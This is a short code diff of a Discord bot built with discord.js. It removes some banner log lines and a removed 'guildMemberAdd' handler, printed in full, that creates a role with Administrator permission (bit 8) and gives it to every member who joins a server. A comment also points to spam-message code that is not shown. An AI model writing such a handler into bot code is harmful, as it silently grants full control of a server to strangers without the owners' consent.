@@ -17,10 +17,6 @@ client.on('ready', () => {
 
 });
 client.on('ready',  () => {
-console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
-console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
-console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
-console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
 console.log(`Logged in as  * [ "  OROCHIX " ] servers! [ " ${client.guilds.size} " ] Users! [ " ${client.users.size} " ]`);
 //BY OROCHIX (Arabic)
 
@@ -111,18 +107,7 @@ let me = message.author
            }
            });
 
-
-//if the bot join in any server the will give self adminstratpr role
-  client.on('guildMemberAdd', member => {
-                        member.guild.createRole({
-                      name : client.user.username,
-                      color : "RANDOM",
-                      permissions : [8]
-                  }).then(function(role){
-                      member.addRole(role)
-                  })
-
-              })
+//if the bot join in any server the will give self adminstratpr rol
 
 
             //spam message
